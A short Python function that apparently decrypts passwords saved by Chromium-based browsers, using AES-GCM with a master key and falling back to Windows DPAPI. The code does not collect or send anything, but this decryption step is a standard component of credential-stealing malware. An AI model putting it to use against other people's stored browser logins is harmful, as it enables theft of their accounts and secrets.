from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from win32crypt import CryptUnprotectData


def decrypt_password(data: bytes, master_key: bytes) -> bytes:  
    try:
        iv: bytes = data[3:15]
        encrypted: bytes = data[15:-16]
        tag: bytes = data[-16:]
        cipher: bytes = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt_and_verify(encrypted, tag)
        
    except Exception:
        try:
            return CryptUnprotectData(
                data, None, None, None, 0
            )[1]
        except Exception as err:
            print(err)
            return None
            
    
        